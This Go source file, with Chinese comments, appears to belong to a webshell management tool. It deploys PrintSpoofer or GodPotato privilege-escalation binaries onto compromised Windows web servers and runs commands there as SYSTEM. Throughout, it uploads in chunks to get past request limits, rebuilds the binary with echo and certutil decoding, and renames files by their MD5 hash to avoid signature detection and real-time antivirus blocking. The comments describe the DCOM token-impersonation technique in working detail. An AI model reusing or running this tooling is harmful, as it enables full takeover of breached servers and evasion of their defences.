package shell

import (
	"context"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
	"time"
)

// PrivEscOptions 描述一次 PrintSpoofer 部署与执行所需的全部参数。
// EXE 为服务端内嵌的 PrintSpoofer.exe 字节；Path 为靶机落盘路径；
// Mode ∈ command|list|interactive；Command 为 -c 待执行命令；PID 为可选的 -p 进程 PID。
type PrivEscOptions struct {
	EXE     []byte
	Path    string
	Tool    string // 提权工具：printspoofer（空按 printspoofer 处理）
	Mode    string // printspoofer 专用：command | list | interactive
	Command string
	PID     string // printspoofer 专用：-p 模拟进程 PID
}

// 提权工具说明：
//
//  1. PrintSpoofer 依赖 winspool.drv 的未公开导出
//     RpcRemoteFindFirstPrinterChangeNotificationEx；该导出在 Windows Server 2022
//     （build 20348）及更新版本上已被整体移除，原理性失效。
//  2. godpotato-cpp / godpotato-go 走 DCOM OXID hook + 命名管道冒充，两者实现等价：
//     hook combase 的 UseProtseq，把 rpcss 的解析重定向到本进程监听的命名管道，
//     ImpersonateNamedPipeClient 拿到 rpcss 的 NETWORK SERVICE 令牌后，再从进程句柄表
//     复制 SYSTEM 主令牌执行命令。
//  3. 纯 Go 版（tools/godpotato）落地时踩过的关键坑：
//     - hook 用 syscall.NewCallback 提供原生回调即可，不需要 C 重写；
//     - 返回给 native 的 DUALSTRINGARRAY 必须用 LocalAlloc 分配（Go 堆指针会被 GC 回收）；
//     - CoInitializeEx/CoCreateInstance/CoUnmarshalInterface 是线程绑定的，
//       ImpersonateNamedPipeClient 也是线程绑定的，相关 goroutine 必须 runtime.LockOSThread；
//     - GetTokenInformation 第一次传 NULL 只为取长度，返回值是「预期失败」，不能当错误；
//     - 拿到令牌后要立即关闭管道句柄，否则 rpcss 的 ResolveOxid 会一直挂住
//       CoUnmarshalInterface；
//     - DUALSTRINGARRAY 的字符串绑定必须按 UTF-16LE 编码，写成 ASCII 会被以
//       0x8001011D（OBJREF 格式无效）拒绝。

// DeployStep 是部署过程中的一步，含发给靶机的命令与回显，供前端「部署自检」逐条展示。
type DeployStep struct {
	Name   string `json:"name"`
	Cmd    string `json:"cmd"`
	Output string `json:"output"`
	OK     bool   `json:"ok"`
}

// DeployReport 是「仅部署、不执行」的自检报告：把上传/组装/校验每一步都摊开，
// 用于在不跑提权的前提下定位靶机侧到底是写不进、读不出还是拼不上。
type DeployReport struct {
	Path     string       `json:"path"`
	Size     int          `json:"size"`
	MD5      string       `json:"md5"`
	Chunks   int          `json:"chunks"`
	Skipped  bool         `json:"skipped"`  // 目标已存在且 MD5 一致，跳过上传
	Verified bool         `json:"verified"` // 落盘 MD5 与内嵌字节一致
	Note     string       `json:"note"`     // 落盘目录发生回退等说明
	Steps    []DeployStep `json:"steps"`
}

// uploadChunkSize 是单次上传的二进制字节数（64KB）。
//
// 为什么必须分块：靶机侧对请求体大小有硬上限——经典 ASP 的 maxRequestEntityAllowed
// 默认仅 200KB，一次性提交整个 PrintSpoofer.exe（base64 后数 MB）会让 IIS 直接返回
// HTTP 500（"An error occurred on the server when processing the URL..."）。
// 64KB 明文 → base64 约 88KB → URL 编码后约 95KB，对 200KB 上限留出一倍余量。
const uploadChunkSize = 64 * 1024

// 组装分块的轮数与间隔：应对靶机侧刚写入的文件句柄尚未释放（copy 报「拒绝访问」）。
// 每轮会依次尝试 assembleStrategies 里的全部策略，故总尝试次数为二者相乘。
const (
	assembleAttempts   = 2
	assembleRetryDelay = 1500 * time.Millisecond
)

// defaultDeployPath 是未指定落盘路径时的默认值。
const defaultDeployPath = `C:\Windows\Temp\PrintSpoofer.exe`

// PrivEsc 把内嵌的 PrintSpoofer.exe 自动部署到靶机并以 SYSTEM 身份执行。
//
// 是否跳过上传，只看「靶机上该文件的 MD5 是否与内嵌字节一致」：一致才跳过。
// 之所以不用「文件是否存在」——上一轮若留下一个空/残缺的 exe，存在性判断会认为已部署，
// 于是永远不再上传，执行时只报一句「不是内部或外部命令」，问题被彻底藏起来。
func PrivEsc(ctx context.Context, o ExecOptions, opts PrivEscOptions) (Result, error) {
	if len(opts.EXE) == 0 {
		return Result{}, fmt.Errorf("未提供 PrintSpoofer.exe 二进制（服务未内嵌）")
	}
	if !SupportsStructured(o.Type) {
		return Result{}, fmt.Errorf("自动部署仅支持 php-eval / asp / asp-vbs / aspnet 类型靶机（php-cmd 不支持文件写入）；" +
			"请改用上述类型，或手动上传 PrintSpoofer.exe 后选 command 模式")
	}
	rep, err := deploy(ctx, o, opts, nil)
	if err != nil {
		return Result{}, err
	}
	// 落盘路径以 deploy 实际使用的为准（指定目录不可用时可能已回退到别的目录）。
	cmd, err := buildPrivEscCommand(rep.Path, opts.Tool, opts.Mode, opts.Command, opts.PID)
	if err != nil {
		return Result{}, err
	}
	run := o
	run.Timeout = 120 * time.Second
	res := Execute(ctx, run.WithCommand(cmd))
	// 把真实落盘路径（{md5}.exe）回传给前端，用于覆盖运行结果里的命令预览，
	// 否则前端只会显示用户填写的 C:\Windows\Temp\GodPotato.exe，与实际执行文件对不上。
	res.DeployedPath = rep.Path
	return res, nil
}

// DeployOnly 只把内嵌二进制部署到靶机并校验，不执行提权。返回逐步报告。
// 用于排查「上传/组装/校验」这一段的靶机侧问题，无需走完整提权流程。
func DeployOnly(ctx context.Context, o ExecOptions, opts PrivEscOptions) (DeployReport, error) {
	if len(opts.EXE) == 0 {
		return DeployReport{}, fmt.Errorf("未提供 PrintSpoofer.exe 二进制（服务未内嵌）")
	}
	if !SupportsStructured(o.Type) {
		return DeployReport{}, fmt.Errorf("自动部署仅支持 php-eval / asp / asp-vbs / aspnet 类型靶机（php-cmd 不支持文件写入）")
	}
	var steps []DeployStep
	rep, err := deploy(ctx, o, opts, &steps)
	rep.Steps = steps
	return rep, err
}

// deploy 是 PrivEsc 与 DeployOnly 共用的部署链路：分块上传 → 组装 → MD5 校验。
// steps 非 nil 时逐步记录命令与回显（自检用）；为 nil 时不记录（正常提权用）。
func deploy(ctx context.Context, o ExecOptions, opts PrivEscOptions, steps *[]DeployStep) (DeployReport, error) {
	data := opts.EXE
	want := md5Hex(data)
	run := o
	run.Timeout = 120 * time.Second
	d := &deployer{ctx: ctx, o: run, steps: steps}

	// 先定落盘目录。某些靶机的 Temp 是「只写目录」：能创建文件，却既读不回也删不掉
	//（实测 C:\Windows\Temp 上 del 与 copy 均「拒绝访问」），那样分块写完必然组装失败。
	// 因此先探测目录的创建/读取/删除三项能力，首选目录不可用时自动回退。
	// 用户填写的 Path 既可能是完整文件路径（C:\Windows\Temp\GodPotato.exe），
	// 也可能只是目录（C:\Windows\Temp\）；deployDirOf 两种都能正确取到目录部分。
	preferred := deployDirOf(defaultPath(opts.Path))
	dir, note, err := d.resolveDeployDir(preferred)
	if err != nil {
		return DeployReport{Path: winJoin(preferred, want+".exe"), Size: len(data), MD5: want, Note: note}, err
	}
	// 落盘文件名用内嵌字节的 MD5:同名即同内容,靶机上已存在同 MD5 的文件就可直接跳过
	// 上传(见下方预检);也避免不同工具共用固定文件名互相覆盖,
	// 顺带让文件名不像固定特征(如 PrintSpoofer.exe)那样易被查杀。
	path := winJoin(dir, want+".exe")
	rep := DeployReport{Path: path, Size: len(data), MD5: want, Note: note}

	if got, _, ok := d.md5(path, "预检：目标文件 MD5"); ok && strings.EqualFold(got, want) {
		rep.Skipped, rep.Verified = true, true
		return rep, nil
	}
	final, err := d.deployBinary(data, path, want, &rep)
	if err != nil {
		return rep, err
	}
	if final != path {
		rep.Path = final
		if rep.Note == "" {
			rep.Note = fmt.Sprintf("目标路径 %s 已存在且无法删除，改落 %s", path, final)
		}
	}
	rep.Verified = true
	return rep, nil
}

// normalizeFsWritePath 规整写文件的落盘路径（统一分隔符、去首尾空白）。
// 放在 FsWrite 入口处兜底：无论前端拼出的是 / 还是 \，进入靶机载荷前都已统一。
func normalizeFsWritePath(p string) string {
	return normalizeWinPath(p)
}

// deployer 持有一次部署所需的上下文，并把每步命令与回显记进 steps（可为 nil）。
type deployer struct {
	ctx   context.Context
	o     ExecOptions
	steps *[]DeployStep
}

// run 执行一条靶机命令并记一步。
func (d *deployer) run(name, cmd string) (string, error) {
	out, err := runCmd(d.ctx, d.o, cmd)
	d.record(name, cmd, out, err)
	return out, err
}

// md5 取靶机文件 MD5 并记一步。
func (d *deployer) md5(path, name string) (hash, raw string, ok bool) {
	cmd := `certutil -hashfile "` + path + `" MD5`
	raw, err := runCmd(d.ctx, d.o, cmd)
	d.record(name, cmd, raw, err)
	if err != nil {
		return "", raw, false
	}
	h, found := findHex32(raw)
	return h, raw, found
}

func (d *deployer) record(name, cmd, out string, err error) {
	if d.steps == nil {
		return
	}
	*d.steps = append(*d.steps, DeployStep{
		Name:   name,
		Cmd:    shorten(cmd),
		Output: oneLine(out),
		OK:     err == nil,
	})
}

// resolveDeployDir 选出一个可「创建 + 读取 + 删除」的落盘目录：
// 先试首选目录（用户指定路径所在目录），再依次试靶机 Web 根目录与 %TEMP%。
// 全部不可用时返回错误，并把每个候选的探针回显汇总进 report 供排查。
func (d *deployer) resolveDeployDir(preferred string) (dir, report string, err error) {
	preferred = trimSep(normalizeWinPath(preferred))
	cands := make([]string, 0, 3)
	if preferred != "" {
		cands = append(cands, preferred)
	}
	// Web 根目录：Web 进程在此必然具备读写能力，是最可靠的落点。
	if root, ok := d.webRoot(); ok {
		cands = append(cands, trimSep(normalizeWinPath(root)))
	}
	if tp, ok := d.tempDir(); ok {
		cands = append(cands, trimSep(normalizeWinPath(tp)))
	}
	seen := map[string]bool{}
	var probes []string
	for _, c := range cands {
		if c == "" || seen[c] {
			continue
		}
		seen[c] = true
		if ok, out := d.probeDir(c); ok {
			if !strings.EqualFold(c, preferred) && preferred != "" {
				return c, fmt.Sprintf("指定目录 %s 不满足创建/读取/删除，已回退到 %s", preferred, c), nil
			}
			return c, "", nil
		} else {
			probes = append(probes, fmt.Sprintf("[%s] %s", c, oneLine(out)))
		}
	}
	return "", strings.Join(probes, " "),
		fmt.Errorf("找不到可「创建+读取+删除」的落盘目录；候选探针: %s", strings.Join(probes, " "))
}

// probeDir 在目录里做「创建 → 读取 → 删除」三项探针。
//
// 用显式 echo 标记而不是「回显是否为空」判成败：靶机侧统一追加了 2>&1，
// 一旦把输出重定向到 nul，错误信息会被一起丢掉，从而把失败误判成成功
// （上一版 `type f > nul` 就是这样得出「首块可读」的假阳性）。
// probeDir 用「纯 cmd」验证目录能否创建、读取、删除文件。
//
// 刻意不走 fs.write：实测 ADODB.Stream 落盘的文件 cmd 打不开（type / copy / del 一律
// 「拒绝访问」，尽管 dir 能列出、内容也对），所以「fs.write 写 + cmd 读」这类组合在这类
// 靶机上必然失败。而主策略 C 全程只用 cmd 读写，故探针也必须按「cmd 自建、自读、自删」
// 来验——早先版本先 FsWrite 再被 echo 覆盖，读到的其实是 cmd 自己的文件，探针永远通过，
// 属于典型的假阳性。
func (d *deployer) probeDir(dir string) (bool, string) {
	f := strings.TrimRight(dir, `\`) + `\wsh_probe.tmp`
	cmd := `echo x > "` + f + `" && echo WCREATED && type "` + f + `" && echo WREAD && del /q "` + f + `" && echo WDELETED`
	out, _ := d.run("目录探针 "+dir, cmd)
	ok := strings.Contains(out, "WCREATED") && strings.Contains(out, "WREAD") && strings.Contains(out, "WDELETED")
	return ok, out
}

// webRoot 经 fs.list(".") 解析靶机当前目录（通常是 Web 根目录）。
func (d *deployer) webRoot() (string, bool) {
	_, resolved, err := FsList(d.ctx, d.o, ".")
	if err != nil || strings.TrimSpace(resolved) == "" {
		return "", false
	}
	return strings.TrimSpace(resolved), true
}

// tempDir 取靶机的 %TEMP%。
func (d *deployer) tempDir() (string, bool) {
	out, err := d.run("读取 %TEMP%", "echo %TEMP%")
	if err != nil {
		return "", false
	}
	p := strings.TrimSpace(out)
	if p == "" || strings.Contains(p, "%") {
		return "", false
	}
	return p, true
}

// deployBinary 把 EXE 落到靶机 dst，并以 MD5 校验成品。
//
// 依序尝试三套策略，每套都以「MD5 是否一致」为成败判据（runCmd 只反映 HTTP 层面，
// copy 等命令自身失败时靶机仍返回 200，绝不能把它的返回当作成功）：
//
//	A 单次直写：一次 fs.write 写整个文件。PHP(post_max_size 默认 8M) 与
//	  ASP.NET(maxRequestLength 默认 4M) 都够用；经典 ASP 仅 200KB 会失败 → 落到 B。
//	B 分块 + copy/move 组装：为经典 ASP 的 200KB 上限而设计，代价是需要 cmd 读回分块。
//	C 命令通道 echo 追加 + certutil 解码：全程只由 cmd 创建/读写文件，完全不碰
//	  fs.write 写出的文件。实测某靶机上 fs.write 写出的文件 cmd 既读不回也删不掉，
//	  而 cmd 自建文件读写删均正常（目录探针三项全过），此时 A/B 都无解，只有 C 可用；
//	  代价是约 280 次请求（cmd 单条命令行上限 8191 字符）。
func (d *deployer) deployBinary(data []byte, dst, want string, rep *DeployReport) (string, error) {
	if len(data) == 0 {
		return dst, fmt.Errorf("二进制为空，无法部署")
	}
	delOut, _ := d.run("清理旧目标", `del /q "`+dst+`"`)

	// 策略顺序是踩出来的，别随意调：
	//   C 放第一位——全程只由 cmd 创建/读取/写入文件。实测 fs.write（ADODB.Stream）
	//     落盘的文件 cmd 打不开（type/copy/del 一律「拒绝访问」，但 dir 能列出、内容也对），
	//     所以任何「fs.write 写 + cmd 读」的组合（A/B）在这类靶机上必然失败。
	//   A 次之：单次 fs.write 直写，仅当靶机不存在上述问题时最快（一个请求搞定）。
	//   B 兜底：为经典 ASP 的 200KB 请求体上限而设计，代价是仍需 cmd 读回分块。
	strategies := []struct {
		name string
		fn   func() (string, error)
	}{
		{"C 命令通道echo+certutil", func() (string, error) { return d.strategyEcho(data, dst) }},
		{"A 单次直写", func() (string, error) { return d.strategySingle(data, dst) }},
		{"B 分块+copy组装", func() (string, error) { return d.strategyChunks(data, dst, want, rep) }},
	}
	var notes []string
	for _, st := range strategies {
		p, err := st.fn()
		if err != nil {
			notes = append(notes, st.name+"失败: "+err.Error())
			continue
		}
		if got, _, ok := d.md5(p, "校验：落盘 MD5（"+st.name+"）"); ok && strings.EqualFold(got, want) {
			return p, nil
		}
		notes = append(notes, st.name+": 写完但 MD5 校验未通过")
	}
	return dst, fmt.Errorf("三套部署策略均失败：%s；del 回显: %s", strings.Join(notes, "；"), oneLine(delOut))
}

// strategySingle 一次 fs.write 把整个文件写过去（请求数最少）。
func (d *deployer) strategySingle(data []byte, dst string) (string, error) {
	b64 := base64.StdEncoding.EncodeToString(data)
	err := FsWrite(d.ctx, d.o, dst, b64)
	if d.steps != nil {
		*d.steps = append(*d.steps, DeployStep{
			Name:   "A 单次直写",
			Cmd:    fmt.Sprintf("fs.write %s（%d 字节明文 → %d 字节 base64）", dst, len(data), len(b64)),
			Output: okOrErr(err),
			OK:     err == nil,
		})
	}
	return dst, err
}

// strategyChunks 分块写入后组装（为经典 ASP 的 200KB 请求体上限而设计）。
// 分块名带一次性随机 token，避免与历史遗留（且删不掉）的同名分块混在一起。
func (d *deployer) strategyChunks(data []byte, dst, want string, rep *DeployReport) (string, error) {
	chunkSize := uploadChunkSize
	total := (len(data) + chunkSize - 1) / chunkSize
	prefix := dst + "." + strings.TrimPrefix(marker(), "ws-")
	parts := make([]string, 0, total)
	for off := 0; off < len(data); off += chunkSize {
		end := off + chunkSize
		if end > len(data) {
			end = len(data)
		}
		part := fmt.Sprintf("%s.p%04d.tmp", prefix, len(parts))
		err := FsWrite(d.ctx, d.o, part, base64.StdEncoding.EncodeToString(data[off:end]))
		if d.steps != nil {
			*d.steps = append(*d.steps, DeployStep{
				Name:   fmt.Sprintf("上传分块 %d/%d", len(parts)+1, total),
				Cmd:    fmt.Sprintf("fs.write %s（%d 字节明文）", part, end-off),
				Output: okOrErr(err),
				OK:     err == nil,
			})
		}
		if err != nil {
			d.cleanupParts(prefix)
			return dst, fmt.Errorf("上传分块 %d 失败: %w", len(parts)+1, err)
		}
		parts = append(parts, part)
	}
	rep.Chunks = len(parts)

	var copyOut string
	assembles := assembleStrategies(parts, dst, prefix)
	for i := 0; i < assembleAttempts; i++ {
		if i > 0 {
			time.Sleep(assembleRetryDelay)
		}
		for si, sc := range assembles {
			out, _ := d.run(fmt.Sprintf("组装 策略%d（第%d轮）", si+1, i+1), sc)
			copyOut += fmt.Sprintf("[策略%d] %s ", si+1, oneLine(out))
			if got, _, ok := d.md5(dst, "校验：组装后 MD5"); ok && strings.EqualFold(got, want) {
				d.cleanupParts(prefix)
				return dst, nil
			}
		}
	}
	diag := d.collectDiag(parts, dst, prefix)
	d.cleanupParts(prefix)
	return dst, fmt.Errorf("分块组装失败（%d 套策略 × %d 轮）：%s；copy 回显: %s",
		len(assembles), assembleAttempts, diag, strings.TrimSpace(copyOut))
}

// strategyEcho 完全走命令通道：把 base64 文本用 echo 逐段写入 <dst>.b64，
// 再 certutil -decode 还原为二进制。全程只由 cmd 创建、读取、写入文件。
// 返回实际落盘路径（可能与 dst 不同，见下面的回退）。
func (d *deployer) strategyEcho(data []byte, dst string) (string, error) {
	b64 := base64.StdEncoding.EncodeToString(data)
	tmp := dst + ".b64"
	_, _ = d.run("清空 base64 临时文件", `del /q "`+tmp+`"`)

	// cmd 单条命令行上限 8191 字符，故每段取 8000。
	const echoChunkSize = 8000
	total := (len(b64) + echoChunkSize - 1) / echoChunkSize
	for i := 0; i < total; i++ {
		off := i * echoChunkSize
		end := off + echoChunkSize
		if end > len(b64) {
			end = len(b64)
		}
		op := ">>"
		if i == 0 {
			op = ">"
		}
		// 重定向符前不留空格：否则 echo 会把尾随空格一起写进 base64。
		cmd := `echo ` + b64[off:end] + op + `"` + tmp + `"`
		out, err := runCmd(d.ctx, d.o, cmd)
		if err != nil {
			d.record("C 追加 base64 文本", shorten(cmd), out, err)
			return dst, fmt.Errorf("追加第 %d/%d 段失败: %w", i+1, total, err)
		}
	}
	d.record("C 追加 base64 文本",
		fmt.Sprintf("echo 分 %d 段写入 %s（共 %d 字节 base64）", total, tmp, len(b64)), "ok", nil)

	// certutil -decode 拒绝覆盖已存在的目标文件（0x80070050 ERROR_FILE_EXISTS）。
	// 若 dst 已存在且删不掉——典型是此前策略 A 用 fs.write 落盘、继承了目录「只写不读」
	// ACE 的残留，cmd 无权删——就退到同目录的唯一名，从那里执行，不必强求覆盖 dst。
	out := dst
	if o, _ := d.run("清理旧目标", `del /q "`+dst+`"`); strings.Contains(o, "拒绝访问") {
		out = dst + "." + strings.TrimPrefix(marker(), "ws-") + ".new"
		d.record("C 回退落盘路径", "del "+dst, "目标已存在且删不掉，改落 "+out, nil)
	}
	if o, err := d.run("certutil 解码", `certutil -decode "`+tmp+`" "`+out+`"`); err != nil {
		return dst, fmt.Errorf("certutil 解码失败: %w（%s）", err, oneLine(o))
	}
	_, _ = d.run("清理 base64 临时文件", `del /q "`+tmp+`"`)
	return out, nil
}

// assembleStrategies 返回把分块拼成目标文件的若干套命令序列，按序尝试：
//  1. copy /b 直接写到目标（通常是 .exe）——最直观；
//  2. 先拼到 <dst>.all.tmp，再 move 成目标——绕开「直接创建 .exe 被拒」：
//     实测分块经 type 验证可读、del 也确认目标不存在，copy 却仍「拒绝访问」，
//     说明卡在「创建 .exe」这一步（实时防护拦截 .exe 落盘是典型成因）；
//     move 是同卷改名，只改元数据、不重写内容，走的是另一条落盘路径；
//  3. 同上，但拼接改用通配符（规避命令行长度或路径解析差异）。
func assembleStrategies(parts []string, dst, prefix string) []string {
	tmp := prefix + ".all.tmp"
	return []string{
		buildCopyCmd(parts, dst),
		buildCopyCmd(parts, tmp) + ` & move /y "` + tmp + `" "` + dst + `"`,
		`copy /b /y "` + prefix + `.p*.tmp" "` + tmp + `" & move /y "` + tmp + `" "` + dst + `"`,
	}
}

// buildCopyCmd 拼出 `copy /b /y "p1"+"p2"..." dst` 形式的合并命令。
func buildCopyCmd(parts []string, dst string) string {
	var b strings.Builder
	b.WriteString("copy /b /y")
	for _, p := range parts {
		b.WriteString(` "` + p + `"+`)
	}
	// 去掉末尾多余的 '+'，再加上目标路径。
	return strings.TrimSuffix(b.String(), "+") + ` "` + dst + `"`
}

// cleanupParts 清理落盘过程中产生的中间文件（成功与失败路径都会调用）：
// 分块 <prefix>.pNNNN.tmp、拼接中间体 <prefix>.all.tmp、以及探测用的 .ctest.tmp。
// prefix 含一次性随机 token，故不会误伤（也误伤不到）历史遗留的同名分块。
func (d *deployer) cleanupParts(prefix string) {
	_, _ = d.run("清理分块", `del /q "`+prefix+`.p*.tmp"`)
	_, _ = d.run("清理拼接中间体", `del /q "`+prefix+`.all.tmp"`)
	_, _ = d.run("清理探测文件", `del /q "`+prefix+`.ctest.tmp"`)
}

// collectDiag 组装失败时收集现场信息。
//
// 「拒绝访问」落点不同，修法完全不同，必须分清：
//   - 读不出源分块：目录只给了写权限，或文件句柄仍被占用 → 换目录 / 等句柄释放；
//   - 写不进目标：目标已存在且被占用（如残留进程） → 换文件名或结束占用进程；
//   - 仅「创建 .exe」被拒（实时防护），而同目录写 .tmp 正常 → 改用 .tmp 拼接 + move 改名。
func (d *deployer) collectDiag(parts []string, dst, prefix string) string {
	var b strings.Builder
	if out, err := d.run("诊断：列出分块", `dir /b "`+prefix+`.p*.tmp"`); err == nil {
		n := 0
		for _, l := range strings.Split(out, "\n") {
			if strings.TrimSpace(l) != "" {
				n++
			}
		}
		b.WriteString(fmt.Sprintf("分块列表 %d 个（期望 %d）", n, len(parts)))
	} else {
		b.WriteString("分块列表取不到（" + oneLine(out) + "）")
	}
	if len(parts) > 0 {
		// 读取测试用 echo 标记判定（理由见 probeDir：重定向到 nul 会连错误一起吞掉）。
		if out, _ := d.run("诊断：首块读取测试", `type "`+parts[0]+`" > nul && echo WREAD`); strings.Contains(out, "WREAD") {
			b.WriteString("；首块可读")
		} else {
			b.WriteString("；首块读取失败")
		}
		// 单块 copy 到同目录的 .tmp：判断 copy 能否在该目录落文件。
		if out, _ := d.run("诊断：copy 到 .tmp", `copy /b /y "`+parts[0]+`" "`+prefix+`.ctest.tmp" && echo WCOPY`); strings.Contains(out, "WCOPY") {
			b.WriteString("；copy到.tmp: 可写")
		} else {
			b.WriteString("；copy到.tmp失败")
		}
	}
	return b.String()
}

// runCmd 在靶机上执行一条命令，返回回显；靶机侧失败时转成 error（附带回显便于排错）。
// 注意：它只反映 HTTP 层面——命令自身失败（如 copy 报「拒绝访问」）时靶机仍可能返回
// HTTP 200，因此关键步骤必须以产物（如 MD5）校验为准，不能只看这里的 error。
func runCmd(ctx context.Context, o ExecOptions, cmd string) (string, error) {
	res := Execute(ctx, o.WithCommand(cmd))
	if !res.OK {
		msg := res.Error
		if strings.TrimSpace(msg) == "" {
			msg = fmt.Sprintf("命令执行失败（HTTP %d）", res.Status)
		}
		return res.Output, fmt.Errorf("%s", msg)
	}
	return res.Output, nil
}

// findHex32 在文本中找出一段长度恰为 32 的十六进制串（MD5）。更长/更短的十六进制串
// （如 SHA1 的 40 位）会被跳过，以免其它哈希被误当作 MD5。
func findHex32(s string) (string, bool) {
	for i := 0; i < len(s); {
		if !isHex(s[i]) {
			i++
			continue
		}
		j := i
		for j < len(s) && isHex(s[j]) {
			j++
		}
		if j-i == 32 {
			return s[i:j], true
		}
		i = j
	}
	return "", false
}

func isHex(c byte) bool {
	return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')
}

func md5Hex(b []byte) string {
	sum := md5.Sum(b)
	return hex.EncodeToString(sum[:])
}

// oneLine 把多行回显压成单行，避免中文错误提示把整体报错撑散、难以阅读。
func oneLine(s string) string {
	return strings.Join(strings.Fields(strings.TrimSpace(s)), " ")
}

// okOrErr 把 error 转成报告里可直接展示的一行文本。
func okOrErr(err error) string {
	if err != nil {
		return err.Error()
	}
	return "ok"
}

// shorten 截断超长命令（如拼了上百个分块的 copy），避免自检报告被撑爆。
func shorten(s string) string {
	const max = 300
	if len(s) <= max {
		return s
	}
	return s[:max] + fmt.Sprintf(" …(截断，共 %d 字符)", len(s))
}

// defaultPath 规整用户填写的落盘路径：去掉首尾空白，并把分隔符统一成反斜杠。
//
// 统一分隔符是必需的，不能只靠「Windows 兼容 /」的印象：
//   - echo > 的重定向走 Win32 CreateFile，会把 / 归一成 \，于是文件被创建成了另一个名字；
//   - 而 copy / del / type 是 cmd.exe 的内部命令，由 cmd 自己按「/ 是开关前缀」解析路径，
//     实测把 / 当成分隔符去读/删时就报「找不到文件 / 拒绝访问」。
// 二者对同一条路径的解析不一致，正是此前组装环节失败的根因。
func defaultPath(p string) string {
	if strings.TrimSpace(p) == "" {
		return defaultDeployPath
	}
	return normalizeWinPath(p)
}

// normalizeWinPath 把路径里的正斜杠统一换成反斜杠，并折叠连续的反斜杠。
func normalizeWinPath(p string) string {
	s := strings.TrimSpace(p)
	if !isWinPath(s) {
		return s
	}
	return strings.TrimRight(strings.ReplaceAll(s, `/`, `\`), `\`)
}

// isWinPath 判定路径是否为 Windows 形态：带盘符前缀（C:\ 或 C:/），或已含反斜杠。
//
// 不能无条件把 / 换成 \：POSIX 路径（如 /var/www/html）里 / 是合法分隔符，
// 而 \ 在 Linux 上是普通文件名字符，替换会把路径写坏。
func isWinPath(s string) bool {
	if len(s) >= 2 && s[1] == ':' && isAlpha(s[0]) {
		return true
	}
	return strings.Contains(s, `\`)
}

func isAlpha(c byte) bool {
	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
}

// parentDir 取路径的目录部分（兼容 / 与 \ 两种分隔符）。
func parentDir(p string) string {
	i := strings.LastIndexAny(strings.TrimSpace(p), `\/`)
	if i < 0 {
		return ""
	}
	return p[:i]
}

// deployDirOf 从用户填写的 Path 推出落盘【目录】：
//   - 形如 C:\Windows\Temp\GodPotato.exe（末段含扩展名）→ 取父目录 C:\Windows\Temp；
//   - 形如 C:\Windows\Temp\ 或 C:\Windows\Temp（末段无扩展名，视作目录名）→ 整条即目录。
//
// 之所以不能直接 parentDir：若用户只填目录（前端默认值已改为 C:\Windows\Temp\），
// 直接取父目录会错砍掉末级目录（C:\Windows\Temp → C:\Windows）。按末段是否含 '.' 区分文件/目录。
func deployDirOf(p string) string {
	np := normalizeWinPath(p)
	if np == "" {
		return normalizeWinPath(defaultDeployPath)
	}
	base := baseName(np)
	if strings.Contains(base, ".") {
		return parentDir(np)
	}
	return np
}

// baseName 取路径的文件名部分。
func baseName(p string) string {
	i := strings.LastIndexAny(strings.TrimSpace(p), `\/`)
	if i < 0 {
		return strings.TrimSpace(p)
	}
	return p[i+1:]
}

// winJoin 以反斜杠拼接目录与文件名：靶机是 Windows，路径分隔符固定用 \，
// 不能用 filepath.Join（它按服务端 OS 选分隔符，服务端可能是 Linux）。
func winJoin(dir, name string) string {
	return trimSep(dir) + `\` + name
}

// trimSep 去掉路径末尾多余的 / 与 \。
func trimSep(p string) string {
	return strings.TrimRight(p, `\/`)
}

// buildPrivEscCommand 把表单字段拼成最终交给靶机执行的命令行。
//
// 引号处理是这里的全部难点：cmd /c 对引号有特殊规则（见 cmd /? 的规则 2）——命令行首尾
// 各有一个引号时，它会剥掉首尾引号并把中间内容整体当作一个程序名。于是
//
//	"C:\Windows\Temp\PrintSpoofer.exe" -c "whoami"
//
// 会被解析成名为 `C:\Windows\Temp\PrintSpoofer.exe" -c "whoami` 的命令，靶机报
// 「不是内部或外部命令，也不是可运行的程序」。因此：
//   - 路径不含空格时不加引号：整条命令只有 -c 参数带一对引号，首字符不是引号，
//     不触发剥离规则，可原样正确执行；
//   - 路径含空格时必须加引号，此时改用 cmd /s /c "…" 整体包裹：/s 只剥离最外层一对
//     引号、其后按字面执行，且同样兼容「靶机侧是否自行再包一层引号」两种情况。
// buildPrivEscCommand 把表单字段拼成最终交给靶机执行的命令行。
//
// 引号处理是这里的全部难点：cmd /c 对引号有特殊规则（见 cmd /? 的规则 2）——命令行首尾
// 各有一个引号时，它会剥掉首尾引号并把中间内容整体当作一个程序名。于是
//
//	"C:\Windows\Temp\PrintSpoofer.exe" -c "whoami"
//
// 会被解析成名为 `C:\Windows\Temp\PrintSpoofer.exe" -c "whoami` 的命令，靶机报
// 「不是内部或外部命令，也不是可运行的程序」。因此：
//   - 路径不含空格时不加引号：整条命令只有 -c 参数带一对引号，首字符不是引号，
//     不触发剥离规则，可原样正确执行；
//   - 路径含空格时必须加引号，此时改用 cmd /s /c "…" 整体包裹：/s 只剥离最外层一对
//     引号、其后按字面执行，且同样兼容「靶机侧是否自行再包一层引号」两种情况。
func buildPrivEscCommand(path, tool, mode, command, pid string) (string, error) {
	spaced := strings.ContainsAny(path, " \t")
	exe := path
	if spaced {
		exe = `"` + path + `"`
	}
	// 命令用双引号包裹；内部双引号转义为 \"，避免 cmd.exe 解析错位。
	esc := strings.ReplaceAll(command, `"`, `\"`)

	var cmd string
	switch strings.ToLower(strings.TrimSpace(tool)) {
	case "godpotato-cpp", "godpotato-go":
		// GodPotato 的 C++ / 纯 Go 版用法一致：<exe> -cmd "cmd /c <command>"。
		// 它们不解释 -c/-l/-i，也不需要 PID，只有「以 SYSTEM 跑一条命令」。
		if strings.TrimSpace(command) == "" {
			return "", fmt.Errorf("command 模式需要填写要执行的命令")
		}
		cmd = exe + ` -cmd "cmd /c ` + esc + `"`
	default:
		switch strings.ToLower(strings.TrimSpace(mode)) {
		case "list":
			cmd = exe + " -l"
		case "interactive":
			cmd = exe + " -i"
		default:
			if strings.TrimSpace(command) == "" {
				return "", fmt.Errorf("command 模式需要填写要执行的命令")
			}
			cmd = exe + ` -c "` + esc + `"`
		}
		if strings.TrimSpace(pid) != "" {
			cmd += " -p " + strings.TrimSpace(pid)
		}
	}
	if spaced {
		cmd = `cmd /s /c "` + cmd + `"`
	}
	return cmd, nil
}
